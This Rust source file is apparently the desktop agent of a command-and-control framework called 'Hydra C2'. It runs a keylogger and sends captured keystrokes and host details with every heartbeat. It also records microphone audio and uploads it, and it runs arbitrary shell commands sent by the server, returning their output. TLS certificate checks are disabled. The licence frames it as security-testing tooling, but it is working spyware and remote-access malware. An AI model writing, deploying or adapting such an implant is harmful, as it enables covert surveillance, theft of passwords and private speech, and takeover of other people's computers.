/*
Copyright (c) 2026 José María Micoli
Licensed under {'license_type': 'AGPLv3'}

You may:
✔ Study
✔ Modify
✔ Use for internal security testing

You may NOT:
✘ Offer as a commercial service
✘ Sell derived competing products
*/

use reqwest::Client;
use std::time::Duration;
use tokio::time::sleep;
use serde_json::Value;
use sysinfo::System;
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicBool, Ordering};
use once_cell::sync::Lazy;
use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};

mod keylogger;
use keylogger::Keylogger;

// --- GLOBAL STATE ---
static IS_RECORDING: Lazy<Arc<AtomicBool>> = Lazy::new(|| Arc::new(AtomicBool::new(false)));
static AUDIO_BUFFER: Lazy<Arc<Mutex<Vec<f32>>>> = Lazy::new(|| Arc::new(Mutex::new(Vec::new())));

// New Global State for Keylogging
static IS_LOGGING: Lazy<Arc<AtomicBool>> = Lazy::new(|| Arc::new(AtomicBool::new(false)));
static KEY_LOGS: Lazy<Arc<Mutex<String>>> = Lazy::new(|| Arc::new(Mutex::new(String::new())));

// --- HELPER FUNCTIONS ---
fn save_wav(samples: &[f32], spec: cpal::SupportedStreamConfig) -> String {
    let hostname = System::host_name().unwrap_or_else(|| "desktop".into());
    let filename = format!("capture_{}.wav", hostname);
    let spec_hound = hound::WavSpec {
        channels: spec.channels() as u16,
        sample_rate: spec.sample_rate().0,
        bits_per_sample: 32,
        sample_format: hound::SampleFormat::Float,
    };
    let mut writer = hound::WavWriter::create(&filename, spec_hound).expect("Failed to create wav writer");
    for &sample in samples {
        writer.write_sample(sample).unwrap();
    }
    filename
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client_id = "DESKTOP-HEAD-ALPHA";
    let server_url = "https://127.0.0.1:8443";
    
    let mut sys = System::new_all();
    let battery_manager = battery::Manager::new().ok();

    // Initialize Keylogger Thread immediately (It listens to IS_LOGGING internally)
    let logger = Keylogger::new(Arc::clone(&KEY_LOGS), Arc::clone(&IS_LOGGING));
    logger.start();

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .use_rustls_tls()
        .build()?;

    println!(r#"
    _    _           _              _____ ___  
   | |  | |         | |            / ____|__ \ 
   | |__| |_   _  __| |_ __ __ _  | |       ) |
   |  __  | | | |/ _` | '__/ _` | | |      / / 
   | |  | | |_| | (_| | | | (_| | | |____ / /_ 
   |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
             __/ |                               
            |___/                                

    >> Desktop Head: Task Queue Active [CPU MODE]
    "#);

    loop {
        sys.refresh_all();
        let hostname = System::host_name().unwrap_or_else(|| "unknown".to_string());
        let mut battery_level = "No Battery".to_string();
        
        if let Some(mgr) = &battery_manager {
            if let Ok(mut batteries) = mgr.batteries() {
                if let Some(Ok(batt)) = batteries.next() {
                    battery_level = format!("{:.0}%", batt.state_of_charge().value * 100.0);
                }
            }
        }

        // Collect and Flush Keylogs for this heartbeat
        let current_logs = {
            let mut logs = KEY_LOGS.lock().unwrap();
            let content = logs.clone();
            logs.clear();
            content
        };

        let telemetry = serde_json::json!({
            "hostname": hostname,
            "os_version": System::os_version().unwrap_or_default(),
            "cpu_count": sys.cpus().len(),
            "total_memory": sys.total_memory() / 1024 / 1024,
            "battery": battery_level,
            "keylogs": current_logs, // Attached to every heartbeat
        });

        let checkin_url = format!("{}/checkin/{}?platform=desktop", server_url, client_id);

        match client.post(&checkin_url).json(&telemetry).send().await {
            Ok(response) => {
                if response.status().is_success() {
                    let body: Value = response.json().await?;
                    if let Some(command) = body.get("command") {
                        if !command.is_null() {
                            let action = command["action"].as_str().unwrap_or("");
                            let data = &command["data"];

                            println!("[!] Task Received: {}", action);

                            match action {
                                "keylog_start" => {
                                    IS_LOGGING.store(true, Ordering::SeqCst);
                                    println!(">> [ACTION] Keylogging Started");
                                },
                                "keylog_stop" => {
                                    IS_LOGGING.store(false, Ordering::SeqCst);
                                    println!(">> [ACTION] Keylogging Stopped");
                                },
                                "record_stop" => {
                                    IS_RECORDING.store(false, Ordering::SeqCst); 
                                    println!("\n>> [ACTION] Stopping Capture...");
                                    
                                    sleep(Duration::from_millis(800)).await;

                                    let samples = AUDIO_BUFFER.lock().unwrap().clone();
                                    if !samples.is_empty() {
                                        let host = cpal::default_host();
                                        let device = host.default_input_device().unwrap();
                                        let config = device.default_input_config().unwrap();
                                        
                                        let wav_file = save_wav(&samples, config);
                                        let url = format!("{}/upload/{}", server_url, client_id);
                                        
                                        if let Ok(content) = std::fs::read(&wav_file) {
                                            let part = reqwest::multipart::Part::bytes(content).file_name(wav_file.clone());
                                            let form = reqwest::multipart::Form::new().part("file", part);
                                            match client.post(&url).multipart(form).send().await {
                                                Ok(_) => {
                                                    println!("[+] Audio Exfiltrated: {}", wav_file);
                                                    let _ = std::fs::remove_file(wav_file);
                                                }
                                                Err(e) => eprintln!("[-] Upload failed: {}", e),
                                            }
                                        }
                                    }
                                }
                                "shell" => {
                                    let cmd_text = data["cmd"].as_str().unwrap_or("");
                                    let out = std::process::Command::new("sh").arg("-c").arg(cmd_text).output();
                                    if let Ok(o) = out {
                                        let res = String::from_utf8_lossy(&o.stdout).to_string();
                                        let _ = client.post(format!("{}/report/{}", server_url, client_id)).json(&serde_json::json!({"output": res})).send().await;
                                    }
                                }
                                _ => println!("[?] Unknown action"),
                            }
                        }
                    }
                }
            }
            Err(e) => eprintln!("[!] Connection failed: {}", e),
        }
        sleep(Duration::from_secs(10)).await;
    }
}